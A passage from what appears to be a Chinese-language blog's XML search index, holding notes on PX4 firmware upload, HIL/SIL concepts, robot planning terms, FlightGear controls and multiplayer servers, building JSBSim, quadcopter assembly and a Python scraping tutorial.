通过在命令后面添加‘upload’，编译的二进制程序就会通过USB上传到飞控硬件: 1make px4fmu-v2_default upload 上传成功时输出情况如下： 123456Erase : [====================] 100.0%Program: [====================] 100.0%Verify : [====================] 100.0%Rebooting.[100%] Built target upload 参考链接 PX4 Development Guide (STABLE - v1.8.2),by Dronecode. PX4开发指南, by Dronecode. running JMAVSim in vmware fails, by jMAVSim issues.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[硬件在环与软件在环概念辨析]]></title>
    <url>%2F2019%2F04%2F25%2F%E7%A1%AC%E4%BB%B6%E5%9C%A8%E7%8E%AF%E4%B8%8E%E8%BD%AF%E4%BB%B6%E5%9C%A8%E7%8E%AF%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在PX4自驾仪软件的二次开发过程中，涉及硬件在环与软件在环两个概念，不易理解。下面对这两个概念进行辨析。 基本概念硬件在环硬件在环（Hardware in the Loop，简称HIL）即硬件在控制环路，是一种半实物仿真。根据控制器和控制对象是否为真实硬件，分为以下两种硬件在环方式： 虚拟控制器+实际对象=快速控制原型(RCP)仿真系统，是系统的一种半实物仿真； 实际控制器+虚拟对象=硬件在回路(HIL)仿真系统，是系统的另一种半实物仿真。 硬件在环主要用于测试控制器系统。 软件在环软件在环主要测试控制器模型与控制器模型代码实现之间的一致性。 处理器在环软件在环主要测试控制器模型与控制器模型代码实现在目标处理器上运行之间的一致性。 模型在环模型在环（Model in the Loop，简称MIL）是用模型驱动进行嵌入式系统的开发时，在开发阶段初期及建模阶段中进行的仿真方式。嵌入式系统需和其运作的环境互动，一般会预期有合理的传感器信号为其输入，也会依输入及系统设计来驱动实体系统。为了使系统正常工作，需要将嵌入式系统的环境纳入仿真考量范围内。若嵌入式系统模型和环境模型连接，一起进行仿真，则即称为模型在环模拟。 模型在环主要用于测试控制算法，其控制器模型和控制器对象都是虚拟的。 参考链接 请明白人通俗的解释一下什么叫硬件在环？, by zhihu. 简单说说MIL、SIL、PIL和HIL, by Wangxn665. 模型在环, by wikipedia. 硬件在环, by 百度百科.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器人路径规划、轨迹规划和运动规划概念辨析]]></title>
    <url>%2F2019%2F04%2F17%2F%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%B7%AF%E5%BE%84%E8%A7%84%E5%88%92-%E8%BD%A8%E8%BF%B9%E8%A7%84%E5%88%92%E5%92%8C%E8%BF%90%E5%8A%A8%E8%A7%84%E5%88%92%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在机器人自动控制研究中，路径规划、轨迹规划和运动规划三个概念总是混淆不清，难以捉摸。下面结合各种资料，给出我个人的一些理解，对这三个概念进行辨析。 基本概念路径规划（path planning）路径是机器人位姿的一定序列，不考虑机器人位姿参数随时间变化的因素。路径规划（一般指位置规划）是找到一系列要经过的路径点，路径点是空间中的位置或关节角度。 轨迹规划（trajectory planning）路径是机器人位姿的一定序列，不考虑机器人位姿参数随时间变化的因素。路径规划（一般指位置规划）是找到一系列要经过的路径点，路径点是空间中的位置或关节角度，而轨迹规划是赋予路径时间信息。 运动规划（motion planning）运动规划就是在给定的位置A与位置B之间为机器人找到一条符合约束条件的路径。运动规划包含路径规划和轨迹规划。 运动规划，又称运动插补，是在给定的路径端点之间插入用于控制的中间点序列从而实现沿给定的平稳运动。 运动控制则是主要解决如何控制目标系统准确跟踪指令轨迹的问题，即对于给定的指令轨迹，选择适合的控制算法和参数，产生输出，控制目标实时，准确地跟踪给定的指令轨迹。 参考链接 运动（motion）规划、路径（path）规划和轨迹（trajectory）规划之区别,by Roger_Ceng. 运动规划/路径规划/轨迹规划,by 小白鼠2号. 运动规划 | 简介篇,by qqfly. 无人车运动规划，路径规划，轨迹规划的区别和联系？, by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear简易飞行教程]]></title>
    <url>%2F2019%2F03%2F29%2FFlightGear%E7%AE%80%E6%98%93%E9%A3%9E%E8%A1%8C%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[FlightGear是一个始于1997年多平台飞行模拟器、自由软件项目。下面简要介绍如何在FlightGear中驾驶飞行。 常用快捷键飞机操纵 9/3 推力：9增加推力（油门），3减小推力（油门） 4/6 副翼：4向左滚转，6向右滚转 8/2 升降舵：8推杆低头，2拉杆抬头 0/Enter 方向舵：0向右偏航，Enter向右偏航 5 居中副翼/升降舵/方向舵 ]/[ 放/收襟翼 g/G 收/放起落架 b/B 刹车（全部轮胎）/或释放刹车 视角变换 x/X 放大/缩小 v/V 切换飞行员的观测模式 Tab 循环切换鼠标模式：正常模式(默认)、控制模式和查看模式。 自动驾驶 Ctril + A 高度保持开关 Ctril + G 下滑角跟随开关 Ctril + H 航向保持开关 Ctril + N NAV 开关 Ctril + T 地形跟随开关 Ctril + U 高度增加 1000 英尺（紧急情况） 起飞教程起飞步骤如下： 1.启动引擎 在驾驶舱内通过按键启动飞机引擎的过程很麻烦，且各种类型飞机引擎启动过程不一样。幸运的是，FlightGear的飞机菜单中会有自动启动或快速启动的子菜单，点击它们自动启动飞机引擎和各种航电设备。 2.释放刹车 使用快捷键B释放刹车。 3.滑跑起飞 飞机尽量在跑道中央进行滑跑起飞，使用快捷键“0/Enter”控制飞机方向舵，使飞机在跑道中央滑跑; 当飞机达到起飞速度（一般200～300km/h）时，先使用快捷键“5”居中副翼/升降舵/方向舵，以降低飞机在空中操纵的难度，再使用快捷键“8/2”操纵飞机升降舵，注意应避免仰角过大。 武器使用教程各种战斗机可通过飞机菜单选择不同武器加载方案。但各种战斗机的武器使用方法不一样，对应武器发射的快捷键也不一样，可通过菜单“Help-&gt;Aircraft Help”查看具体飞机的自定义快捷键。下面以官方飞机库中的F15和F16为例说明武器使用方法。 F15F15武器使用步骤如下： 1.打开Master ARM开关 该军械总开关防止武器误发射，使用快捷键Ctrl+w控制。 2.选择武器 可选择航炮和导弹等武器，使用快捷键m控制 3.发射航炮或释放导弹 使用快捷键e控制，注意航炮按e就发射，而导弹按e得持续3秒钟才能释放导弹。 4.使用诱饵弹 使用快捷键Ctrl+q释放诱饵弹。 F16F16武器使用步骤如下： 1.打开Master ARM开关 该开关防止武器误发射，使用快捷键m控制。 2.选择武器 可选择航炮和导弹等武器，使用快捷键w控制 3.发射航炮或释放导弹 使用快捷键e控制，注意航炮按e就发射，而导弹按e得持续3秒钟才能释放导弹。 4.使用诱饵弹 使用快捷键q释放诱饵弹。 参考链接 FlightGear,by wikipedia. FlightGear基本飞行操作快捷键,by zxc.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSBSim编程实践之入门]]></title>
    <url>%2F2019%2F03%2F27%2FJSBSim%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%B9%8B%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。JSBSim可以独立运行，通过命令行参数指定飞行器和初始状态，进行简单情境下的飞行动力学仿真，也可以将JSBSim作为代码库，编程实现飞行器模型加载，设置输入，获得输出。下面即介绍在Linux平台编程调用JSBSim库的方法和步骤。 基础知识gcc与g++GNU编译器套装（英语：GNU Compiler Collection，缩写为GCC），指一套编程语言编译器，以GPL及LGPL许可证所发行的自由软件，也是GNU项目的关键部分，也是GNU工具链的主要组成部分之一。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。 通常gcc用于编译链接c代码文件，而g++用于编译链接c++代码文件，但它们的使用方法很类似。下面介绍gcc和g++的常用选项。 添加头文件搜索路径 1gcc foo.c -I /home/xiaowp/include -o foo 添加动态库搜索路径 1gcc foo.c -L /home/xiaowp/lib -lfoo -o foo 添加静态库搜索路径 1gcc foo.c -L /home/xiaowp/lib -static -lfoo -o foo 编程实践最简仿真下面是JSBSim参考手册中的最简单实例，因JSBSim的不断开发，JSBSim参考手册中该编程实例有点过时，因此进行了少量修改。 1234567891011121314#include &lt;FGFDMExec.h&gt;#include &lt;sg_path.hxx&gt; using namespace std;int main(int argc, char **argv)&#123; JSBSim::FGFDMExec FDMExec; bool result = true; FDMExec.LoadScript(SGPath::fromUtf8(argv[1])); while (result) result = FDMExec.Run();&#125; 从上述代码可知，调用JSBSim的主要方法是利用FGFDMExec类，通过实例化一个FGFDMExec类，就相当于获得了一个运行JSBSim仿真的工具箱，通过这个工具箱就可以调用JSBSim的大部分功能，实现我们要的仿真目标。 接下来对该实例进行编译链接，使用如下命令： 12# jsbsim_script.cpp是上述实例的代码文件g++ jsbsim_script.cpp -I ../jsbsim/src/ -I../jsbsim/src/simgear/misc -L ../jsbsim/build/src/ -static -l JSBSim -o jsbsim_script 测试该实例，使用如下命令：1234# jsbsim是JSBSim项目文件夹# JSBSimTest是JSBSim测试实例所在文件夹cd jsbsim../JSBSimTest/jsbsim_script ./scripts/c1723.xml 参考链接 JSBSim编程实践,by 32768. 战斗机与引擎速查,by 么的聊. JSBSim学习笔记(3)—— 基本概念,by 么的聊. JSBSim学习笔记(6)——飞行控制系统,by 么的聊. Linux平台编译安装测试JSBSim,by jack huang. JSBSim Reference Manual ,by jsbsim. gcc和g++头文件和库路径的寻找和添加,by 周学伟. GCC,by wikipedia. WHAT IS THE DIFFERENCE BETWEEN GCC AND G++,by KITTY GUPTA.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四旋翼无人机制作简易教程]]></title>
    <url>%2F2019%2F03%2F25%2F%E5%9B%9B%E6%97%8B%E7%BF%BC%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%88%B6%E4%BD%9C%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[四轴飞行器又称四旋翼、四转子，是一种多轴飞行器，有四个旋翼来悬停、维持姿态及平飞。和固定翼飞机不同，它通过旋翼提供的推力使飞机升空。它的四个旋翼大小相同，分布位置接近对称。对于简单的设计来说，仅仅通过调整不同旋翼之间的相对速度来调节不同位置的推力，并克服每个旋翼之间的反扭力矩，就可以控制飞机维持姿态、或完成各种机动飞行。下面简单介绍四旋翼无人机的制作过程。 无人机硬件装配组装一件无人机所需配件及其连接示意图如图1所示。 图1 四旋翼无人机机硬件连接图 所需配件主要有： 机身骨架 一对正浆和一对反浆。注意浆的固定方向与电机旋转方向要一致。 遥控器及接收机 无刷电机及电调 ppm sum receiver pixhawk 1，内含安全开关和蜂鸣器 gps 锂电池 云台和摄像头（可选） telemetry无线收发装置与图传（可选） 无人机软件调试遥控器与接收机之间对码遥控器和接收机之间是配对的，使用之前必须对码，可根据遥控器的使用说明书进行操作。其连接示意图如图2所示。 图2 航模遥控器与接收机对码示意图 电子调速器的油门行程和进角设置电子调速器主要控制马达的转速，其调试连接示意图如图3所示。 图3 电子调速器连接示意图 如图3所示将电子调速器连接后，即开始设置油门行程和电子调速器进角。设置油门行程即让电子调速器知道遥控器的油门输入范围。而电子调速器进角有高中低之分，类似于汽车档位。低进角速度慢但扭力大，高进角速度快但扭力小，一般设置电子调速器中进角即可满足大多数要求。具体设置说明参照电子调速器使用说明书。 pixhawk飞控平台的设置Pixhawk是PX4飞行堆栈的标准微控制器平台。在pixhawk硬件平台上可运行PX4和ArduPilot两种不同的自动驾驶仪软件套件。如果在pixhawk平台上安装px4自驾仪软件，则使用QGroundControl地面站软件进行设置；如果在pixhawk平台上安装ArduPilot自驾仪软件，则使用MissionPlanner地面站软件进行设置。 Pixhawk和GPS按照方向捆绑好后，按照地面站软件的指示进行设置。设置好之后，长按Pixhawk的安全开关，再将遥控器油门拉动底并推向最右方，即可解锁Pixhawk。 参考链接 四轴飞行器,by wikipedia. PX4 autopilot, by px4 homepage. Crazepony开源四轴飞行器,by crazepony. ArduPilot,by wikipedia. PX4 autopilot,by wikipedia. 从建模分析到控制器设计，四轴飞行器是怎样炼成的？,by 机器人.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear多人服务器的本地安装配置]]></title>
    <url>%2F2019%2F03%2F20%2FFlightGear%E5%A4%9A%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[FGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。 它允许通过FGFS内的网络与其他飞行员一起飞行。 FGMS服务器列表类型主要有： 中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。 交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。 跟踪服务器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。 HUB服务器 - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。 特别呼号： “obsXXXX”（用您喜欢的任何字符替换X）允许连接的FlightGear客户端查看全球所有其他MP飞行员（位置数据和聊天消息），但对他们和MPmap保持不可见。 “mpdummy”阻止在FGTracker上跟踪飞行员。 不推荐 - 如果多个用户使用此呼号，服务器将忽略一些用户。 改为连接到未跟踪的服务器。 安装配置FGMS服务器下载FGMS服务器源码1git clone git://git.code.sf.net/p/fgms/src fgms-src 安装配置FGMS服务器源码123456789cd fgms-srcmkdir buildcd build cmake ..makecd ..cp contrib/etc/fgms_production.skel.conf build/fgms.cfgcd build./fgms 安装配置FGMS跟踪服务器源码下载FGMS跟踪服务器源码1git clone git://git.code.sf.net/p/fgms/fgtracker fgms-fgtracker FlightGear联网飞行配置联机前，请选择合适的服务器名（通常是mpserver0?.flightgear.org）和端口号(通常是5000)，然后按照以下方式启动FlightGear。 使用向导程序在向导程序上专门有一个联网飞行选项，只要选中选项，填入服务器名和端口号以及你的昵称就可以了，你的昵称最长可以使7个字符。同时必须确定AI models选项选中，否则无法看到别的联网飞机。 使用命令行方式基本命令如下:1234--multiplay=out,10,&lt;server&gt;,&lt;portnumber&gt;--multiplay=in,10,&lt;client&gt;,&lt;portnumber&gt;--callsign=&lt;anything&gt;--enable-ai-models 备注: 为端口号，比如5000. 为服务器名，比如mpserver01.flightgear.org. 是你的计算机名，或者是你的联网的IP地址，比如本地IP地址192.168.0.1 是你自己的昵称, 最多7个字符比如NFGFS.当程序开始运行后，你可以在服务器地图上看到自己，如果看不到，检查一下程序是否有报错信息，按照下面将要介绍的内容检查错误。 参考链接 Howto:Multiplayer,by flightgear home. FlightGear Multiplayer Server,by flightgear home.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux平台编译安装测试JSBSim]]></title>
    <url>%2F2019%2F03%2F20%2FLinux%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%B5%8B%E8%AF%95JSBSim%2F</url>
    <content type="text"><![CDATA[JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。 它也可以从一个小型独立程序调用，以创建批处理模拟工具。 JSBSim是用C ++编写的，使用XML配置文件。下面介绍如何在Linux平台编译按照测试JSBSim。 基础知识cmake代码变成可执行文件，叫做编译（compile）；先编译这个，还是先编译那个（即编译的安排），叫做构建（build）。 Make是最常用的构建工具，诞生于1977年，主要用于C语言的项目。但是实际上 ，任何只要某个文件有变化，就要重新构建的项目，都可以用Make构建。 Make工具有很多，例如 GNU Make ，QT 的 qmake ，微软的 MS nmake，BSD Make（pmake），Makepp，等等。这些 Make 工具遵循着不同的规范和标准，所执行的 Makefile 格式也千差万别。这样就带来了一个严峻的问题：如果软件想跨平台，必须要保证能够在不同平台编译。而如果使用上面的 Make 工具，就得为每一种标准写一次 Makefile ，这将是一件让人抓狂的工作。 CMake就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。显然，CMake 是一个比上述几种 make 更高级的编译配置工具。一些使用 CMake 作为项目架构系统的知名开源项目有 VTK、ITK、KDE、OpenCV、OSG 等。 在 linux 平台下使用 CMake 生成 Makefile 并编译的流程如下： 编写 CMake 配置文件 CMakeLists.txt 。 执行命令 cmake PATH 或者 ccmake PATH 生成 Makefile。其中， PATH 是 CMakeLists.txt 所在的目录。 使用 make 命令进行编译。 编译JSBSim下载JSBSim源代码1git clone https://github.com/JSBSim-Team/jsbsim.git 编译JSBSim123456789101112# 跳转到jsbsim源码目录cd jsbsim # 创建build文件夹用于编译jsbsimmkdir build cd build# 生成Makefile文件cmake .. # 编译make # 编译完成后跳转到jsbsim所在目录测试cd src./jsbsim 测试jsbsim1234# 跳转到jsbsim源码目录cd jsbsim # 测试jsbsim./build/src/JSBSim scripts/c1723.xml 参考链接 JSBSim, by wikipedia. Make 命令教程,by 阮一峰 CMake 入门实战,by hahack. JSBSim使用教程, by 32768. cmake 添加头文件目录，链接动态、静态库,by 王彬彬. cmake:install制作简单的安装脚本,by 10km.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear飞行模拟器中创建新飞机的方法]]></title>
    <url>%2F2019%2F03%2F17%2FFlightGear%E9%A3%9E%E8%A1%8C%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%AD%E5%88%9B%E5%BB%BA%E6%96%B0%E9%A3%9E%E6%9C%BA%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[FlightGear中创建新飞机粗略地分成四步：创建飞机的3D模型，创建飞机的飞行动力学模型，创建飞机操作动画，实现飞机各子系统。具体而言，又可分成两个主要的开发领域：飞行动力学模型开发和飞机3D模型开发。 飞机3D模型开发主要包括飞机外形、驾驶舱的3D模型开发，为飞行动力学模型设计的动画，声音等。 加载飞机模型通过OpenSceneGraph，FlightGear支持许多不同的3D文件格式，包括VRML1，AC3D，DXF等等。 但是，.ac是大多数FG模型中使用的标准。 主FlightGear属性树中的属性/ sim / model / path控制将加载的模型; 它需要一个字符串值，从$ FG ROOT给出模型的相对路径。 加载新模型的最简单方法是使用—prop：命令行选项在启动时设置属性; 例如，要使用已安装在$ FG_ROOT / Models / my-cessna.ac中的3D飞机模型，您可以像这样调用FlightGear（在类Unix系统下）： 1fgfs --prop:/sim/model/path=Models/my-cessna.ac （注意：通常模型使用的所有纹理必须出现在同一目录中。如果my-cessna.ac使用纹理cessna01.rgb和cessna02.rgb，你还应该在$ FG_ROOT / Models /中安装这些纹理。 如果要将3D模型永久设置为飞机的默认值而不是在命令行上指定，则需要编辑飞机设置文件。 在$ FG_ROOT / Aircraft /目录中有一系列以-set.xml结尾的文件，例如c172-set.xml，dc3-yasim-set.xml和beech99-uiuc-set.xml。 当您使用—aircraft选项启动FlightGear时，它会从其中一个文件中读取属性; 例如 1fgfs --aircraft=dc3-yasim 将$ FG_ROOT / Aircraft / dc3-yasim-set.xml中的属性加载到主FlightGear属性树中。 这些文件与$ FG_ROOT / preferences.xml和FlightGear保存文件具有相同的XML属性列表格式。 对于任何单机类型，可能有许多具有不同启动条件，声音，面板，3D模型等的XML文件，因此您最好复制现有的，重命名它，然后更改模型内部路径元素内的值SIM卡： 12345678&lt;PropertyList&gt;&lt;sim&gt; &lt;model&gt; &lt;path&gt;Models/my-cessna.ac&lt;/path&gt; &lt;texture-path&gt;./Textures&lt;/texture-path&gt; &lt;/model&gt;&lt;/sim&gt;&lt;/PropertyList&gt; 飞机动力学模型开发FlightGear主要使用JSBSim 和 YASim两个开源的飞行动力学模型，也有极少数使用UIUC飞行动力学模型。 YASimFDM是控制模拟器内飞行物理的数学模型。 物理3D飞机模型与飞行动力学无关 - 实质上它只是一张要看的图片。 这是FDM决定模型如何飞行。 为何选择YASim？ YASim使用飞机的几何形状来生成基本飞行特征。 虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。 如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。 JSBSimJSBSim是一个开源飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。 它也可以从一个小型独立程序调用，以创建批处理模拟工具。 JSBSim自1996年以来一直在开发和使用，并且已经构建在当今使用的所有最流行的平台上，包括运行Linux，Macintosh和Microsoft Windows操作系统的平台。 JSBSim是用C ++编写的，使用XML配置文件。 飞机模型开发规范说明规则和指导 FlightGear中的所有图像的大小应为2的幂（例如64 64,128 256或16 * 1024）。大多数计算机无法处理大于4096像素的纹理。从FlightGear 1.9开始，图像不再需要以.rgb格式保存。现在.png是FlightGear开发人员中最常用的.png。 请注意，我们在代码中使用空格，一些开发人员使用相应的选项卡，以使我们的代码易于（呃）阅读。每一行开始一个新标签，我们按空格键一次，这样你就可以得到一种楼梯。只要您在所有文件中始终如一地使用它，使用何种方法并不重要。但是JSBSim FDM使用的XML文件必须使用空格而不是制表符。 在大多数操作系统上，文件名和目录区分大小写。 Windows不区分大小写，因此当您在Windows计算机上进行开发时，您不会发现任何问题。在其他操作系统上，“波音”和“波音”之间存在差异。由于FlightGear用于多个平台，请确保您的代码正确使用大写字母！ 目录结构说明创建一个新的飞机模型，应该在$FG_ROOT/Aircraft/路径下创建文件夹，以飞机名称命名。例如在$FG_ROOT/Aircraft/路径下创建一个Su30的文件夹，开始构建Su30飞机模型。在飞机根目录下，其目录结构如下： -set.xml file 描述飞机依赖关系的最重要文件是aircraft-set.xml文件。 .xml file (FDM) 该文件包含飞机的整个（或部分）飞行动力学模型。有YASim、JSBSim、UIUC三种不同的飞行动力学模型，他们都有自己的优缺点。 由于数据有限，YASim通常被认为是最好的方式。 当您访问真实的风洞数据和/或需要更多灵活性时，JSBSim可能是更好的选择。 Engines/ directory 仅适用于JSBSim飞机。 在此目录中，存储引擎和推进器/螺旋桨文件。 Models/ directory 该目录包含所有与模型相关的文件; 例如纹理，模型和动画文件（.xml）。 在-set.xml文件中，我们将路径设置为一个.xml文件。 该文件应链接（间接）到飞机所需的每个其他模型文件（包括可能的3D驾驶舱）。 整个飞机可以建模为一个文件，但大多数开发人员更喜欢拆分。 例如，驾驶舱可以由几个文件构建，每个文件只存在一个仪器或面板。 这样很容易（重新）移动飞机的某些部件。 您可以像这样设置模型文件： 1234567891011121314151617181920212223242526272829303132&lt;PropertyList&gt; &lt;path&gt;Aircraft.ac&lt;/path&gt; &lt;model&gt; &lt;name&gt;Cockpit&lt;/name&gt; &lt;path&gt;Aircraft/.../Models/cockpit.xml&lt;/path&gt; &lt;offsets&gt; &lt;x-m&gt; -5.25&lt;/x-m&gt; &lt;y-m&gt; 0.00&lt;/y-m&gt; &lt;z-m&gt; 1.30&lt;/z-m&gt; &lt;/offsets&gt; &lt;/model&gt; &lt;animation&gt; &lt;type&gt;rotate&lt;/type&gt; &lt;object-name&gt;AileronLeft&lt;/object-name&gt; &lt;property&gt;/controls/flight/aileron&lt;/property&gt; &lt;factor&gt;-65&lt;/factor&gt; &lt;center&gt; &lt;x-m&gt; 2.09&lt;/x-m&gt; &lt;y-m&gt;-5.50&lt;/y-m&gt; &lt;z-m&gt;-1.50&lt;/z-m&gt; &lt;/center&gt; &lt;axis&gt; &lt;x&gt;1&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;z&gt;0&lt;/z&gt; &lt;/axis&gt; &lt;/animation&gt; &lt;/PropertyList&gt; cockpit.xml文件可以包含相似结构，所有工具都是单独的模型。 模型的数量不受限制，动画的数量也不限。 Nasal/ directory 所有针对飞机的Nasal脚本都放在此目录中，但某些系统或仪器特定的Nasal脚本除外。 如果某个Nasal脚本对所有飞机都有用（例如天气或多人相关），它可以放在$ FG_ROOT / Nasal目录中。 可以在$ FG_ROOT / Aircraft / Generic目录中找到可在多架飞机上使用的Nasal脚本（例如空中加油）。 Sounds/ directory 声音对于增加你实际进入模拟的感觉非常重要。 在此目录中，存储了特定于飞行器的所有声音文件。 可以在多个飞机上使用的声音（例如，点击开关或雷声）可在$ FG_ROOT / Sounds目录中找到。 Tutorials/ directory FlightGears教程系统是学习如何启动飞机引擎等的有用功能。 它允许您创建一个分步教程，指导用户完成某个过程。 它甚至可以指示应按下哪些开关！ 参考链接 Howto:Make an aircraft,by flightgear home. Howto:3D Aircraft Models,by flightgear home. Howto:Animate models,by flightgear home. YASim,by flightgear home. JSBSim,by flightgear home.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear安装飞机和场景的方法]]></title>
    <url>%2F2019%2F03%2F13%2FFlightGear%E5%AE%89%E8%A3%85%E9%A3%9E%E6%9C%BA%E5%92%8C%E5%9C%BA%E6%99%AF%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[FlightGear可安装额外的飞行器和地景。 安装地景FlightGear的详细地景可以覆盖整个世界。默认的FlightGear安装包只包括旧金山周边一小块区域，因此想要飞到其他地方，得下载额外的地景。 每一块地景被打包成一个压缩包，每经纬度10度为一块。每一个压缩包以10×10经纬度命名，如w130n50.tgz。 下载FlightGear地景参考链接1。下载后的地景复制到$FG_ROOT/Scenery或者$FG_SCENERY下。 使用如下命令解压地景，将在$FG_ROOT/Scenery产生Objects和Terrain两个文件夹，分别为卫星地图和地形数据。123cd $FG_ROOT/Scenerytar -xvf e110n30.tgzrm e110n30.tgz 安装飞行器默认的FlightGear安装包只有少数几个飞行器，可以从参考链接2中获得大量的飞行器。 下载的飞行器复制到$FG_ROOT/Aircraft文件夹下。 参考链接 下载FlightGear地景， by flightgear. 下载FlightGear飞行器, by flightgear.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫获取网页链接]]></title>
    <url>%2F2019%2F03%2F13%2FPython%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[最近研究开源飞行模拟器，想将其世界地景全部下载下来。一个个手动下载太麻烦，于是想先用python的requests和Beautiful Soup组件获取地景链接，再以每行一个地景链接写入文本文档，最后使用axel多线程自动下载每一个地景包。 基础知识requests组件Requests是一个Python HTTP库，在Apache 2许可证下发布。该项目的目标是使HTTP请求更简单，更人性化。 下面是示例代码： 123456789101112&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get(&apos;https://api.github.com/user&apos;, auth=(&apos;user&apos;, &apos;pass&apos;))&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.headers[&apos;content-type&apos;]&apos;application/json; charset=utf8&apos;&gt;&gt;&gt; r.encoding&apos;utf-8&apos;&gt;&gt;&gt; r.text # doctest: +ELLIPSISu&apos;&#123;&quot;type&quot;:&quot;User&quot;...&apos;&gt;&gt;&gt; r.json() # doctest: +ELLIPSIS&#123;u&apos;private_gists&apos;: 419, u&apos;total_private_repos&apos;: 77, ...&#125; Beautiful Soup组件Beautiful Soup 是一个可以从HTML或XML文件中提取数据的Python库。它能够通过你喜欢的转换器实现惯用的文档导航，查找，修改文档的方式。Beautiful Soup会帮你节省数小时甚至数天的工作时间。 Beautiful Soup支持Python标准库中的HTML解析器，还支持一些第三方的解析器，其中一个是 lxml。 Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag , NavigableString , BeautifulSoup , Comment。 Tag 对象与XML或HTML原生文档中的tag相同，有最重要的属性: name和attributes。 BeautifulSoup 对象表示的是一个文档的全部内容，但并不是真正的HTML或XML的tag，所以它没有name和attribute属性。 Beautiful Soup用 NavigableString 类来包装tag中的字符串。 Comment 对象是一个特殊类型的 NavigableString 对象: 下面是BeautifulSoup的一个简单示例。 123456789101112131415161718192021222324252627282930313233343536from bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc)print(soup.prettify())# &lt;html&gt;# &lt;head&gt;# &lt;title&gt;# The Dormouse&apos;s story# &lt;/title&gt;# &lt;/head&gt;# &lt;body&gt;# &lt;p class=&quot;title&quot;&gt;# &lt;b&gt;# The Dormouse&apos;s story# &lt;/b&gt;# &lt;/p&gt;# &lt;p class=&quot;story&quot;&gt;# Once upon a time there were three little sisters; and their names were# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;# Elsie# &lt;/a&gt;# ,# &lt;a 